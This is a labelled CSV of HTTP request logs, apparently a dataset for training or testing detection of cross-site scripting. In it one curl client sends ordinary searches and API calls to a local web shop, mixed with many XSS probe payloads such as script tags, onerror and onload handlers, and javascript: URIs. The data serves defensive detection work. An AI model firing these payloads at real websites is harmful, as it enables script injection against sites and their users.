timestamp,src_ip,src_port,dest_ip,dest_port,proto,http_method,http_status,http_resp_len,http_url,http_user_agent,http_url_len,url_contains_script_tag,url_contains_onerror,label
2025-08-11T07:01:19.578569+0000,100.64.0.10,34696,100.64.0.20,3000,TCP,GET,200,3748,/?q=<a%20href='javascript:alert(1)'>Click</a>,curl/7.81.0,43,0,0,1
2025-08-11T07:07:24.394841+0000,100.64.0.10,47426,100.64.0.20,3000,TCP,GET,200,3748,/?q=<input%20autofocus%20onfocus=alert(1)>,curl/7.81.0,38,0,0,1
2025-08-11T07:00:45.302666+0000,100.64.0.10,32950,100.64.0.20,3000,TCP,GET,200,3748,/?q=<details%20open%20ontoggle=alert(1)>,curl/7.81.0,36,0,0,1
2025-08-11T06:15:59.429341+0000,100.64.0.10,45910,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T07:01:37.707410+0000,100.64.0.10,38580,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>''-alert(1)//</script>,curl/7.81.0,34,1,0,1
2025-08-11T06:25:06.409966+0000,100.64.0.10,39118,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T07:00:02.959543+0000,100.64.0.10,49162,100.64.0.20,3000,TCP,GET,200,3748,/?q=<body%20onload=alert(1)>,curl/7.81.0,26,0,0,1
2025-08-11T06:58:56.417027+0000,100.64.0.10,49768,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>''-alert(1)//</script>,curl/7.81.0,34,1,0,1
2025-08-11T07:04:29.022212+0000,100.64.0.10,54628,100.64.0.20,3000,TCP,GET,200,3748,/?q=<embed%20src='javascript:alert(1)'>,curl/7.81.0,37,0,0,1
2025-08-11T06:25:24.516552+0000,100.64.0.10,34962,100.64.0.20,3000,TCP,GET,401,982,/api/Users,curl/7.81.0,10,0,0,0
2025-08-11T06:15:17.099370+0000,100.64.0.10,41018,100.64.0.20,3000,TCP,GET,200,3748,/?q=banana,curl/7.81.0,10,0,0,0
2025-08-11T06:15:35.214796+0000,100.64.0.10,34016,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T07:01:01.433318+0000,100.64.0.10,51252,100.64.0.20,3000,TCP,GET,200,3748,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>,curl/7.81.0,79,0,0,1
2025-08-11T07:08:28.897639+0000,100.64.0.10,42078,100.64.0.20,3000,TCP,GET,200,3748,/?q=<object%20data='javascript:alert(1)'>,curl/7.81.0,39,0,0,1
2025-08-11T07:06:58.179262+0000,100.64.0.10,60124,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>/*</script><script>alert(1)</script>,curl/7.81.0,48,1,0,1
2025-08-11T07:09:37.453508+0000,100.64.0.10,49862,100.64.0.20,3000,TCP,GET,200,3748,/?q=<marquee%20onstart=confirm(1)>,curl/7.81.0,32,0,0,1
2025-08-11T06:50:10.218296+0000,100.64.0.10,37776,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>/*</script><script>alert(1)</script>,curl/7.81.0,48,1,0,1
2025-08-11T07:07:52.615874+0000,100.64.0.10,42188,100.64.0.20,3000,TCP,GET,200,3748,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>,curl/7.81.0,67,0,0,1
2025-08-11T06:21:56.007362+0000,100.64.0.10,53874,100.64.0.20,3000,TCP,GET,200,3748,/?q=banana,curl/7.81.0,10,0,0,0
2025-08-11T06:24:45.259201+0000,100.64.0.10,48458,100.64.0.20,3000,TCP,GET,200,3748,/?q=apple,curl/7.81.0,9,0,0,0
2025-08-11T06:29:02.178682+0000,100.64.0.10,37158,100.64.0.20,3000,TCP,GET,200,80222,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-11T06:17:05.908167+0000,100.64.0.10,59182,100.64.0.20,3000,TCP,GET,200,3748,/?q=healthy,curl/7.81.0,11,0,0,0
2025-08-11T06:24:18.081958+0000,100.64.0.10,38568,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:23:23.677677+0000,100.64.0.10,35912,100.64.0.20,3000,TCP,GET,401,982,/api/Users,curl/7.81.0,10,0,0,0
2025-08-11T07:00:06.991767+0000,100.64.0.10,49188,100.64.0.20,3000,TCP,GET,200,3748,"/?q=""><svg%20onload=alert(1)>",curl/7.81.0,27,0,0,1
2025-08-11T06:50:48.526718+0000,100.64.0.10,56244,100.64.0.20,3000,TCP,GET,200,3748,/?q=<marquee%20onstart=confirm(1)>,curl/7.81.0,32,0,0,1
2025-08-11T06:51:28.859511+0000,100.64.0.10,55942,100.64.0.20,3000,TCP,GET,200,3748,/?q=<marquee%20onstart=confirm(1)>,curl/7.81.0,32,0,0,1
2025-08-11T06:12:21.725339+0000,100.64.0.10,34478,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T07:04:33.058363+0000,100.64.0.10,54518,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-11T06:57:49.897920+0000,100.64.0.10,49638,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-11T07:07:38.510973+0000,100.64.0.10,40266,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>/*</script><script>alert(1)</script>,curl/7.81.0,48,1,0,1
2025-08-11T06:59:04.483331+0000,100.64.0.10,42942,100.64.0.20,3000,TCP,GET,200,3748,/?q=<object%20data='javascript:alert(1)'>,curl/7.81.0,39,0,0,1
2025-08-11T06:53:56.046873+0000,100.64.0.10,54606,100.64.0.20,3000,TCP,GET,200,3748,/?q=<a%20href='javascript:alert(1)'>Click</a>,curl/7.81.0,43,0,0,1
2025-08-11T06:20:52.565277+0000,100.64.0.10,58276,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:22:17.181544+0000,100.64.0.10,36586,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:13:28.241209+0000,100.64.0.10,49884,100.64.0.20,3000,TCP,GET,200,3748,/?q=orange,curl/7.81.0,10,0,0,0
2025-08-11T07:04:16.928542+0000,100.64.0.10,42884,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>/*</script><script>alert(1)</script>,curl/7.81.0,48,1,0,1
2025-08-11T07:05:11.346413+0000,100.64.0.10,44864,100.64.0.20,3000,TCP,GET,200,3748,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>,curl/7.81.0,67,0,0,1
2025-08-11T06:11:39.400974+0000,100.64.0.10,52374,100.64.0.20,3000,TCP,GET,200,3748,/?q=apple,curl/7.81.0,9,0,0,0
2025-08-11T07:02:50.258615+0000,100.64.0.10,47002,100.64.0.20,3000,TCP,GET,200,3748,/?q=</textarea><script>alert(1)</script>,curl/7.81.0,40,1,0,1
2025-08-11T07:07:54.631095+0000,100.64.0.10,42192,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-11T07:09:19.306589+0000,100.64.0.10,38794,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg%20onload=alert(1)>,curl/7.81.0,25,0,0,1
2025-08-11T06:51:22.809608+0000,100.64.0.10,55912,100.64.0.20,3000,TCP,GET,200,3748,"/?q=""><svg%20onload=alert(1)>",curl/7.81.0,27,0,0,1
2025-08-11T06:15:11.051076+0000,100.64.0.10,34326,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T06:52:43.457091+0000,100.64.0.10,58990,100.64.0.20,3000,TCP,GET,200,3748,"/?q=""><svg%20onload=alert(1)>",curl/7.81.0,27,0,0,1
2025-08-11T07:05:15.381839+0000,100.64.0.10,39672,100.64.0.20,3000,TCP,GET,200,3748,/?q=<img%20src=x%20onerror=alert(1)>,curl/7.81.0,32,0,1,1
2025-08-11T06:59:18.601979+0000,100.64.0.10,39822,100.64.0.20,3000,TCP,GET,200,3748,/?q=<a%20href='javascript:alert(1)'>Click</a>,curl/7.81.0,43,0,0,1
2025-08-11T06:50:40.467461+0000,100.64.0.10,42976,100.64.0.20,3000,TCP,GET,200,3748,/?q=<details%20open%20ontoggle=alert(1)>,curl/7.81.0,36,0,0,1
2025-08-11T06:59:52.881292+0000,100.64.0.10,37766,100.64.0.20,3000,TCP,GET,200,3748,/?q=<img%20src=x%20onerror=alert(1)>,curl/7.81.0,32,0,1,1
2025-08-11T06:23:47.854759+0000,100.64.0.10,49928,100.64.0.20,3000,TCP,GET,401,982,/api/Users,curl/7.81.0,10,0,0,0
2025-08-11T07:05:13.365271+0000,100.64.0.10,39662,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-11T06:19:36.997897+0000,100.64.0.10,45162,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T07:07:04.225873+0000,100.64.0.10,44318,100.64.0.20,3000,TCP,GET,200,3748,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>,curl/7.81.0,79,0,0,1
2025-08-11T06:10:48.052677+0000,100.64.0.10,57436,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:24:42.244622+0000,100.64.0.10,44816,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T07:00:23.123584+0000,100.64.0.10,39520,100.64.0.20,3000,TCP,GET,200,3748,/?q=<video%20src='invalid'%20onerror='alert(1)'>,curl/7.81.0,44,0,1,1
2025-08-11T06:15:14.087652+0000,100.64.0.10,41002,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:10:05.698987+0000,100.64.0.10,46122,100.64.0.20,3000,TCP,GET,200,80222,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-11T06:55:12.676371+0000,100.64.0.10,46912,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg%20onload=alert(1)>,curl/7.81.0,25,0,0,1
2025-08-11T06:56:19.188999+0000,100.64.0.10,53608,100.64.0.20,3000,TCP,GET,200,3748,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>,curl/7.81.0,79,0,0,1
2025-08-11T06:14:01.493212+0000,100.64.0.10,38094,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:14:43.816166+0000,100.64.0.10,43572,100.64.0.20,3000,TCP,GET,200,80222,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-11T06:52:39.422689+0000,100.64.0.10,38234,100.64.0.20,3000,TCP,GET,200,3748,/?q=<body%20onload=alert(1)>,curl/7.81.0,26,0,0,1
2025-08-11T07:08:08.746997+0000,100.64.0.10,35274,100.64.0.20,3000,TCP,GET,200,3748,/?q=<details%20open%20ontoggle=alert(1)>,curl/7.81.0,36,0,0,1
2025-08-11T06:14:58.939254+0000,100.64.0.10,57596,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T06:11:18.248950+0000,100.64.0.10,51908,100.64.0.20,3000,TCP,GET,401,982,/api/Users,curl/7.81.0,10,0,0,0
2025-08-11T06:17:33.100592+0000,100.64.0.10,50314,100.64.0.20,3000,TCP,GET,200,80222,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-11T06:24:57.341456+0000,100.64.0.10,53686,100.64.0.20,3000,TCP,GET,200,3748,/?q=orange,curl/7.81.0,10,0,0,0
2025-08-11T06:25:18.492668+0000,100.64.0.10,60482,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:54:46.468657+0000,100.64.0.10,35604,100.64.0.20,3000,TCP,GET,200,3748,/?q=</textarea><script>alert(1)</script>,curl/7.81.0,40,1,0,1
2025-08-11T06:22:11.132878+0000,100.64.0.10,33884,100.64.0.20,3000,TCP,GET,200,80222,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-11T06:16:14.543426+0000,100.64.0.10,45640,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:11:06.164493+0000,100.64.0.10,50124,100.64.0.20,3000,TCP,GET,500,3285,/api/Baskets,curl/7.81.0,12,0,0,0
2025-08-11T06:53:07.660701+0000,100.64.0.10,43922,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-11T06:13:16.160801+0000,100.64.0.10,52706,100.64.0.20,3000,TCP,GET,200,3748,/?q=healthy,curl/7.81.0,11,0,0,0
2025-08-11T06:27:55.699439+0000,100.64.0.10,44606,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:54:04.109949+0000,100.64.0.10,57332,100.64.0.20,3000,TCP,GET,200,3748,"/?q=""><svg%20onload=alert(1)>",curl/7.81.0,27,0,0,1
2025-08-11T07:03:14.460920+0000,100.64.0.10,33062,100.64.0.20,3000,TCP,GET,200,3748,/?q=<img%20src=x%20onerror=alert(1)>,curl/7.81.0,32,0,1,1
2025-08-11T06:55:32.835554+0000,100.64.0.10,50834,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>/*</script><script>alert(1)</script>,curl/7.81.0,48,1,0,1
2025-08-11T06:26:21.919489+0000,100.64.0.10,34502,100.64.0.20,3000,TCP,GET,200,3748,/?q=banana,curl/7.81.0,10,0,0,0
2025-08-11T06:58:18.115621+0000,100.64.0.10,58024,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg><script>alert(1)</script></svg>,curl/7.81.0,40,1,0,1
2025-08-11T06:20:19.302168+0000,100.64.0.10,51386,100.64.0.20,3000,TCP,GET,200,3748,/?q=apple,curl/7.81.0,9,0,0,0
2025-08-11T07:06:54.144344+0000,100.64.0.10,60100,100.64.0.20,3000,TCP,GET,200,3748,/?q=<img%20src=1%20onerror=prompt(1)>,curl/7.81.0,33,0,1,1
2025-08-11T06:17:11.938781+0000,100.64.0.10,59204,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T06:25:51.688763+0000,100.64.0.10,46626,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T06:58:14.088232+0000,100.64.0.10,58006,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>/*</script><script>alert(1)</script>,curl/7.81.0,48,1,0,1
2025-08-11T07:07:00.196222+0000,100.64.0.10,60126,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>''-alert(1)//</script>,curl/7.81.0,34,1,0,1
2025-08-11T06:56:33.286848+0000,100.64.0.10,45152,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg%20onload=alert(1)>,curl/7.81.0,25,0,0,1
2025-08-11T06:51:14.743387+0000,100.64.0.10,47314,100.64.0.20,3000,TCP,GET,200,3748,/?q=<a%20href='javascript:alert(1)'>Click</a>,curl/7.81.0,43,0,0,1
2025-08-11T06:14:19.627102+0000,100.64.0.10,41358,100.64.0.20,3000,TCP,GET,500,3285,/api/Baskets,curl/7.81.0,12,0,0,0
2025-08-11T07:04:59.254685+0000,100.64.0.10,34678,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>''-alert(1)//</script>,curl/7.81.0,34,1,0,1
2025-08-11T06:16:44.758744+0000,100.64.0.10,33932,100.64.0.20,3000,TCP,GET,500,3285,/api/Baskets,curl/7.81.0,12,0,0,0
2025-08-11T06:51:36.922812+0000,100.64.0.10,51056,100.64.0.20,3000,TCP,GET,200,3748,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>,curl/7.81.0,79,0,0,1
2025-08-11T06:23:02.517489+0000,100.64.0.10,35604,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T06:19:21.870465+0000,100.64.0.10,40374,100.64.0.20,3000,TCP,GET,401,982,/api/Users,curl/7.81.0,10,0,0,0
2025-08-11T06:16:41.743274+0000,100.64.0.10,36494,100.64.0.20,3000,TCP,GET,200,3748,/?q=juice,curl/7.81.0,9,0,0,0
2025-08-11T07:00:09.005646+0000,100.64.0.10,49192,100.64.0.20,3000,TCP,GET,200,3748,/?q=</textarea><script>alert(1)</script>,curl/7.81.0,40,1,0,1
2025-08-11T06:54:24.281162+0000,100.64.0.10,50892,100.64.0.20,3000,TCP,GET,200,3748,/?q=<embed%20src='javascript:alert(1)'>,curl/7.81.0,37,0,0,1
2025-08-11T07:09:21.323158+0000,100.64.0.10,38796,100.64.0.20,3000,TCP,GET,200,3748,/?q=<iframe%20src='javascript:alert(1)'>,curl/7.81.0,38,0,0,1
2025-08-11T06:28:16.821491+0000,100.64.0.10,50352,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T07:00:57.398693+0000,100.64.0.10,51236,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>''-alert(1)//</script>,curl/7.81.0,34,1,0,1
2025-08-11T06:58:01.995484+0000,100.64.0.10,35312,100.64.0.20,3000,TCP,GET,200,3748,/?q=<body%20onload=alert(1)>,curl/7.81.0,26,0,0,1
2025-08-11T07:04:08.868728+0000,100.64.0.10,40280,100.64.0.20,3000,TCP,GET,200,3748,"/?q=""><svg%20onload=alert(1)>",curl/7.81.0,27,0,0,1
2025-08-11T06:54:16.213427+0000,100.64.0.10,57196,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg><script>alert(1)</script></svg>,curl/7.81.0,40,1,0,1
2025-08-11T06:58:06.026092+0000,100.64.0.10,33508,100.64.0.20,3000,TCP,GET,200,3748,"/?q=""><svg%20onload=alert(1)>",curl/7.81.0,27,0,0,1
2025-08-11T07:08:53.097961+0000,100.64.0.10,54290,100.64.0.20,3000,TCP,GET,200,3748,/?q=</textarea><script>alert(1)</script>,curl/7.81.0,40,1,0,1
2025-08-11T06:55:52.993915+0000,100.64.0.10,43956,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg%20onload=alert(1)>,curl/7.81.0,25,0,0,1
2025-08-11T06:55:48.967271+0000,100.64.0.10,58188,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-11T06:26:55.212273+0000,100.64.0.10,37692,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:19:18.855334+0000,100.64.0.10,40370,100.64.0.20,3000,TCP,GET,200,3748,/?q=apple,curl/7.81.0,9,0,0,0
2025-08-11T07:06:03.750776+0000,100.64.0.10,46204,100.64.0.20,3000,TCP,GET,200,3748,/?q=<input%20autofocus%20onfocus=alert(1)>,curl/7.81.0,38,0,0,1
2025-08-11T06:57:05.544986+0000,100.64.0.10,55816,100.64.0.20,3000,TCP,GET,200,3748,/?q=<embed%20src='javascript:alert(1)'>,curl/7.81.0,37,0,0,1
2025-08-11T06:58:48.354308+0000,100.64.0.10,37106,100.64.0.20,3000,TCP,GET,200,3748,/?q=</textarea><script>alert(1)</script>,curl/7.81.0,40,1,0,1
2025-08-11T06:54:06.126163+0000,100.64.0.10,57344,100.64.0.20,3000,TCP,GET,200,3748,/?q=</textarea><script>alert(1)</script>,curl/7.81.0,40,1,0,1
2025-08-11T06:21:59.024345+0000,100.64.0.10,53878,100.64.0.20,3000,TCP,GET,500,3285,/api/Baskets,curl/7.81.0,12,0,0,0
2025-08-11T06:16:38.732299+0000,100.64.0.10,36490,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T07:03:52.748073+0000,100.64.0.10,36358,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-11T06:12:06.629177+0000,100.64.0.10,34912,100.64.0.20,3000,TCP,GET,200,80222,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-11T06:50:56.594962+0000,100.64.0.10,44496,100.64.0.20,3000,TCP,GET,200,3748,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>,curl/7.81.0,79,0,0,1
2025-08-11T06:26:03.793902+0000,100.64.0.10,35316,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T06:52:03.135226+0000,100.64.0.10,36422,100.64.0.20,3000,TCP,GET,200,3748,"/?q=""><svg%20onload=alert(1)>",curl/7.81.0,27,0,0,1
2025-08-11T07:01:21.593117+0000,100.64.0.10,34706,100.64.0.20,3000,TCP,GET,200,3748,/?q=<input%20autofocus%20onfocus=alert(1)>,curl/7.81.0,38,0,0,1
2025-08-11T06:52:35.393789+0000,100.64.0.10,38222,100.64.0.20,3000,TCP,GET,200,3748,/?q=<a%20href='javascript:alert(1)'>Click</a>,curl/7.81.0,43,0,0,1
2025-08-11T07:04:27.008801+0000,100.64.0.10,54616,100.64.0.20,3000,TCP,GET,200,3748,/?q=<object%20data='javascript:alert(1)'>,curl/7.81.0,39,0,0,1
2025-08-11T06:52:55.557796+0000,100.64.0.10,49030,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg><script>alert(1)</script></svg>,curl/7.81.0,40,1,0,1
2025-08-11T07:08:12.777160+0000,100.64.0.10,54632,100.64.0.20,3000,TCP,GET,200,3748,/?q=</textarea><script>alert(1)</script>,curl/7.81.0,40,1,0,1
2025-08-11T06:18:18.433081+0000,100.64.0.10,33828,100.64.0.20,3000,TCP,GET,200,3748,/?q=healthy,curl/7.81.0,11,0,0,0
2025-08-11T06:58:52.382933+0000,100.64.0.10,49754,100.64.0.20,3000,TCP,GET,200,3748,/?q=<marquee%20onstart=confirm(1)>,curl/7.81.0,32,0,0,1
2025-08-11T06:26:15.872353+0000,100.64.0.10,34486,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T06:27:58.713438+0000,100.64.0.10,44610,100.64.0.20,3000,TCP,GET,200,3748,/?q=juice,curl/7.81.0,9,0,0,0
2025-08-11T07:06:33.985422+0000,100.64.0.10,58728,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-11T06:27:31.507964+0000,100.64.0.10,53880,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T07:07:32.461560+0000,100.64.0.10,40228,100.64.0.20,3000,TCP,GET,200,3748,/?q=</textarea><script>alert(1)</script>,curl/7.81.0,40,1,0,1
2025-08-11T06:22:47.392560+0000,100.64.0.10,58028,100.64.0.20,3000,TCP,GET,500,3285,/api/Baskets,curl/7.81.0,12,0,0,0
2025-08-11T07:01:17.561047+0000,100.64.0.10,34686,100.64.0.20,3000,TCP,GET,200,3748,/?q=<iframe%20src='javascript:alert(1)'>,curl/7.81.0,38,0,0,1
2025-08-11T06:22:20.197124+0000,100.64.0.10,36602,100.64.0.20,3000,TCP,GET,200,3748,/?q=banana,curl/7.81.0,10,0,0,0
2025-08-11T07:02:30.106254+0000,100.64.0.10,42702,100.64.0.20,3000,TCP,GET,200,3748,/?q=<form%20action='javascript:alert(1)'><input%20type='submit'></form>,curl/7.81.0,67,0,0,1
2025-08-11T06:52:01.118418+0000,100.64.0.10,41900,100.64.0.20,3000,TCP,GET,200,3748,/?q=<details%20open%20ontoggle=alert(1)>,curl/7.81.0,36,0,0,1
2025-08-11T06:54:10.161902+0000,100.64.0.10,57366,100.64.0.20,3000,TCP,GET,200,3748,/?q=<marquee%20onstart=confirm(1)>,curl/7.81.0,32,0,0,1
2025-08-11T06:10:02.658995+0000,100.64.0.10,46116,100.64.0.20,3000,TCP,GET,200,3748,/?q=banana,curl/7.81.0,10,0,0,0
2025-08-11T06:54:28.318326+0000,100.64.0.10,50912,100.64.0.20,3000,TCP,GET,200,3748,/?q=<script>alert(1)</script>,curl/7.81.0,29,1,0,1
2025-08-11T06:13:49.413999+0000,100.64.0.10,46160,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:23:50.871267+0000,100.64.0.10,49944,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T06:51:49.019807+0000,100.64.0.10,55648,100.64.0.20,3000,TCP,GET,200,3748,/?q=<img%20src=x%20onerror=alert(1)>,curl/7.81.0,32,0,1,1
2025-08-11T06:18:51.658310+0000,100.64.0.10,34120,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:52:33.380856+0000,100.64.0.10,38208,100.64.0.20,3000,TCP,GET,200,3748,/?q=<iframe%20src='javascript:alert(1)'>,curl/7.81.0,38,0,0,1
2025-08-11T06:22:05.075534+0000,100.64.0.10,33872,100.64.0.20,3000,TCP,GET,200,12460,/api/Products,curl/7.81.0,13,0,0,0
2025-08-11T06:24:36.195168+0000,100.64.0.10,44806,100.64.0.20,3000,TCP,GET,401,982,/api/Users,curl/7.81.0,10,0,0,0
2025-08-11T07:09:09.224725+0000,100.64.0.10,42880,100.64.0.20,3000,TCP,GET,200,3748,/?q=<object%20data='javascript:alert(1)'>,curl/7.81.0,39,0,0,1
2025-08-11T06:16:59.856513+0000,100.64.0.10,58598,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T06:49:52.068717+0000,100.64.0.10,34880,100.64.0.20,3000,TCP,GET,200,3748,/?q=<iframe%20src='javascript:alert(1)'>,curl/7.81.0,38,0,0,1
2025-08-11T06:54:22.263178+0000,100.64.0.10,50876,100.64.0.20,3000,TCP,GET,200,3748,/?q=<object%20data='javascript:alert(1)'>,curl/7.81.0,39,0,0,1
2025-08-11T06:17:48.187680+0000,100.64.0.10,35370,100.64.0.20,3000,TCP,GET,200,3748,/,curl/7.81.0,1,0,0,0
2025-08-11T07:07:26.410835+0000,100.64.0.10,47434,100.64.0.20,3000,TCP,GET,200,3748,/?q=<body%20onload=alert(1)>,curl/7.81.0,26,0,0,1
2025-08-11T07:02:52.276078+0000,100.64.0.10,45676,100.64.0.20,3000,TCP,GET,200,3748,/?q=<img%20src=1%20onerror=prompt(1)>,curl/7.81.0,33,0,1,1
2025-08-11T06:59:38.763061+0000,100.64.0.10,52786,100.64.0.20,3000,TCP,GET,200,3748,/?q=<svg><script>alert(1)</script></svg>,curl/7.81.0,40,1,0,1
2025-08-11T07:02:22.043126+0000,100.64.0.10,32804,100.64.0.20,3000,TCP,GET,200,3748,/?q=<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>,curl/7.81.0,79,0,0,1
2025-08-11T06:56:09.113641+0000,100.64.0.10,58658,100.64.0.20,3000,TCP,GET,200,3748,/?q=<img%20src=1%20onerror=prompt(1)>,curl/7.81.0,33,0,1,1
2025-08-11T06:23:56.918506+0000,100.64.0.10,34388,100.64.0.20,3000,TCP,GET,200,3748,/?q=healthy,curl/7.81.0,11,0,0,0
2025-08-11T06:13:31.279049+0000,100.64.0.10,49896,100.64.0.20,3000,TCP,GET,200,80222,/api/Challenges,curl/7.81.0,15,0,0,0
2025-08-11T07:00:13.036581+0000,100.64.0.10,58558,100.64.0.20,3000,TCP,GET,200,3748,/?q=<marquee%20onstart=confirm(1)>,curl/7.81.0,32,0,0,1
